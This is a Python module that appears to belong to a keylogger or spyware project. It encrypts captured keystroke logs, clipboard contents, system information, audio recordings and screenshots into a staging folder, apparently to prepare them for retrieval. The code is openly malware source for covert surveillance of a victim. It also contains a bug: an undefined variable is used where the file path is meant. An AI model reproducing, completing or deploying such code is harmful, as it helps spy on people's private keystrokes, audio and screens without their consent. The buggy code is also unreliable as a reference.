from cryptography.fernet import Fernet
import os
import config

SOURCE_FILES = [
    "logs/keylog.txt",
    "logs/systeminfo.txt",
    "logs/clipboard.txt",
    "logs/audio.wav",
    "logs/screenshot.png"
]
OUTPUT_DIR = "logs/encrypted_data"

fernet = Fernet(config.FERNET_KEY)

def encrypt_files():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    for filepath in SOURCE_FILES:
        if os.path.exists(filepath):
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                    encrypted = fernet.encrypt(data)
                filename = os.path.basename(filename)
                output_path= os.path.join(OUTPUT_DIR, filename + "enc")
                with open(output_path,"wb") as ef:
                    ef.write(encrypted)
                print(f"[INFO] Encrypted {filename} -> {output_path}")
            except Exception as e:
                print(f"[ERROR] Failed to encrypt {filepath}: {e} ")